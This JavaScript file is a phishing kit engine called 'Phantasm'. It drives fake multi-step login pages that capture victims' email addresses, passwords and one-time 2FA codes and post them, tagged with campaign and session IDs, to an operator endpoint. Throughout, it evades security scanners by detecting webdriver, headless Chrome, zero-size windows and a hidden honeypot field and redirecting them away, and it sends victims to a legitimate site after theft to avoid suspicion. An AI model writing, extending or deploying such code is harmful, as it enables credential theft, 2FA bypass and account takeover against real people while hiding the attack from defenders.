// Phantasm Engine - Centralized Phishing Logic
// (c) 2026 Vantablack Project - Authorized Usage Only

class Phantasm {
    constructor(config = {}) {
        this.config = {
            selectors: {
                email: '#email-input',
                password: '#password-input',
                otp: '#otp-input',
                submitBtn: '#submit-btn', // generic submit button
                nextBtn: '#next-btn',     // for multi-step flows
                otpBtn: '#otp-submit-btn',
                step1: '#step-1',         // email/login container
                step2: '#step-2',         // password container
                step3: '#step-3-otp',     // otp container
                errorMsg: '#error-msg',
                userDisplay: '#user-email-display' // element to show email in step 2
            },
            apiEndpoint: null, // Will try to detect from form action or default to /login
            redirectUrl: 'https://google.com', // default fallback
            sessionId: null,
            campaignId: null,
            debug: false,
            ...config
        };

        this.state = {
            email: '',
            password: '',
            currentStep: 1
        };

        // Auto-detect API endpoint if not set
        if (!this.config.apiEndpoint) {
            const form = document.querySelector('form');
            if (form && form.getAttribute('action')) {
                this.config.apiEndpoint = form.getAttribute('action');
                this.log('Auto-detected API endpoint:', this.config.apiEndpoint);
            } else {
                this.config.apiEndpoint = '/login';
            }
        }

        this.init();
    }

    log(msg, data = null) {
        if (this.config.debug) {
            console.log(`[Phantasm] ${msg}`, data || '');
        }
    }

    getElement(key) {
        const selector = this.config.selectors[key];
        return document.querySelector(selector);
    }

    init() {
        this.log('Initializing engine...');
        this.runStealthChecks();
        this.injectHoneypot();
        this.bindEvents();
    }

    injectHoneypot() {
        const forms = document.querySelectorAll('form');
        forms.forEach(form => {
            const hp = document.createElement('input');
            hp.type = 'text';
            hp.name = 'website_hp_field'; 
            hp.style.position = 'absolute';
            hp.style.opacity = '0';
            hp.style.top = '0';
            hp.style.left = '0';
            hp.style.height = '0';
            hp.style.width = '0';
            hp.style.zIndex = '-1';
            hp.tabIndex = -1;
            hp.autocomplete = 'off';
            form.appendChild(hp);
            this.honeypotField = hp;
        });
    }

    runStealthChecks() {
        // 1. Webdriver Check
        if (navigator.webdriver) {
            this.log('Webdriver detected!');
            this.evade();
        }

        // 2. Headless Chrome User Agent Check
        if (/HeadlessChrome/.test(navigator.userAgent)) {
            this.log('Headless Chrome detected!');
            this.evade();
        }

        // 3. Basic resolution check (bots often have 0x0 or very small viewports)
        if (window.outerWidth === 0 && window.outerHeight === 0) {
            this.log('Zero dimension window detected!');
            this.evade();
        }

        // 4. Permissions check (inconsistent permissions often indicate bots)
        if (navigator.permissions && navigator.permissions.query) {
            navigator.permissions.query({name: 'notifications'}).then(permissionStatus => {
                if(Notification.permission === 'denied' && permissionStatus.state === 'prompt') {
                     // Inconsistent state
                }
            });
        }

        // 5. Interaction Check Setup
        this.interactionVerified = false;
        ['mousemove', 'keydown', 'touchstart', 'scroll'].forEach(evt => {
            window.addEventListener(evt, () => {
                this.interactionVerified = true;
            }, { once: true });
        });
    }

    evade() {
        // Redirect to a benign site immediately
        window.location.href = 'https://www.google.com';
        throw new Error('Access Denied');
    }

    bindEvents() {
        const nextBtn = this.getElement('nextBtn');
        const submitBtn = this.getElement('submitBtn');
        const otpBtn = this.getElement('otpBtn');
        
        // Handle Email Step (if separate)
        if (nextBtn) {
            nextBtn.addEventListener('click', (e) => {
                e.preventDefault();
                if (!this.interactionVerified && !this.config.debug) {
                    this.log('Suspicious: No interaction before click');
                    // Optional: Block or delay
                }
                this.handleEmailStep();
            });

            // Bind Enter key on email input
            const emailInput = this.getElement('email');
            if (emailInput) {
                emailInput.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        this.handleEmailStep();
                    }
                });
            }
        }

        // Handle Login Submission
        if (submitBtn) {
            submitBtn.addEventListener('click', (e) => {
                e.preventDefault();
                if (this.honeypotField && this.honeypotField.value) {
                    this.log('Honeypot filled - Bot detected!');
                    this.evade();
                    return;
                }
                if (!this.interactionVerified && !this.config.debug) {
                    this.log('Suspicious: No interaction before submit');
                }
                this.handleLogin();
            });
            // Bind Enter key on password input
            const passwordInput = this.getElement('password');
            if (passwordInput) {
                passwordInput.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        this.handleLogin();
                    }
                });
            }
        }

        // Handle OTP Step
        if (otpBtn) {
            otpBtn.addEventListener('click', (e) => {
                e.preventDefault();
                if (!this.interactionVerified && !this.config.debug) {
                    this.log('Suspicious: No interaction before OTP submit');
                }
                this.handleOTP();
            });
             // Bind Enter key on OTP input
             const otpInput = this.getElement('otp');
             if (otpInput) {
                 otpInput.addEventListener('keypress', (e) => {
                     if (e.key === 'Enter') {
                         e.preventDefault();
                         this.handleOTP();
                     }
                 });
             }
        }
    }

    handleEmailStep() {
        const emailInput = this.getElement('email');
        if (!emailInput || !emailInput.value) {
            this.showError('Please enter your email.');
            return;
        }
        this.state.email = emailInput.value;
        
        // Update UI if needed (e.g. show email in next step)
        const userDisplay = this.getElement('userDisplay');
        if (userDisplay) userDisplay.innerText = this.state.email;

        this.transitionToStep(2);
    }

    async handleLogin() {
        const emailInput = this.getElement('email');
        const passwordInput = this.getElement('password');

        // If single step login (email + password together)
        if (emailInput && !this.state.email) {
            this.state.email = emailInput.value;
        }

        if (!this.state.email || !passwordInput.value) {
            this.showError('Please enter your credentials.');
            return;
        }

        this.state.password = passwordInput.value;
        const btn = this.getElement('submitBtn');
        const originalText = btn ? btn.innerText : 'Sign in';
        
        if (btn) {
            btn.disabled = true;
            btn.innerText = 'Verifying...';
        }

        try {
            const payload = {
                email: this.state.email,
                password: this.state.password
            };

            if (this.config.sessionId) payload.sid = this.config.sessionId;
            if (this.config.campaignId) payload.cid = this.config.campaignId;

            const response = await fetch(this.config.apiEndpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            const data = await response.json();
            this.log('Login response:', data);

            if (data.status === '2fa_required') {
                this.transitionToStep(3);
            } else if (data.redirect) {
                window.location.href = data.redirect;
            } else {
                // Fallback success
                window.location.href = this.config.redirectUrl;
            }
        } catch (error) {
            console.error('Login error:', error);
            // On error, usually redirect to real site to avoid suspicion
            window.location.href = this.config.redirectUrl;
        } finally {
            if (btn) {
                btn.disabled = false;
                btn.innerText = originalText;
            }
        }
    }

    async handleOTP() {
        const otpInput = this.getElement('otp');
        if (!otpInput || !otpInput.value) {
            return; // Silent fail or visual cue
        }

        const btn = this.getElement('otpBtn');
        if (btn) {
            btn.innerText = 'Verifying...';
            btn.disabled = true;
        }

        try {
            const payload = {
                otp: otpInput.value
            };
            
            if (this.config.sessionId) payload.sid = this.config.sessionId;
            if (this.config.campaignId) payload.cid = this.config.campaignId;

            const response = await fetch(this.config.apiEndpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            const data = await response.json();
            this.log('OTP response:', data);

            if (data.redirect) {
                window.location.href = data.redirect;
            } else {
                window.location.href = this.config.redirectUrl;
            }
        } catch (error) {
             console.error('OTP error:', error);
             window.location.href = this.config.redirectUrl;
        }
    }

    transitionToStep(stepNumber) {
        this.log(`Transitioning to step ${stepNumber}`);
        const s1 = this.getElement('step1');
        const s2 = this.getElement('step2');
        const s3 = this.getElement('step3');

        // Reset visibility
        if (s1) s1.style.display = 'none';
        if (s1) s1.classList.add('hidden'); // Support class-based hiding
        
        if (s2) s2.style.display = 'none';
        if (s2) s2.classList.add('hidden');

        if (s3) s3.style.display = 'none';
        if (s3) s3.classList.add('hidden');

        // Show target step
        let target;
        if (stepNumber === 1) target = s1;
        if (stepNumber === 2) target = s2;
        if (stepNumber === 3) target = s3;

        if (target) {
            target.style.display = ''; // Revert to CSS default
            target.classList.remove('hidden');
            
            // Auto-focus input
            if (stepNumber === 1) {
                const i = this.getElement('email');
                if (i) i.focus();
            } else if (stepNumber === 2) {
                const i = this.getElement('password');
                if (i) i.focus();
            } else if (stepNumber === 3) {
                const i = this.getElement('otp');
                if (i) i.focus();
            }
        }
        
        this.state.currentStep = stepNumber;
    }

    showError(msg) {
        const errEl = this.getElement('errorMsg');
        if (errEl) {
            errEl.innerText = msg;
            errEl.style.display = 'block';
        } else {
            alert(msg); // Fallback, though ugly
        }
    }
}

// Auto-export to window
window.Phantasm = Phantasm;
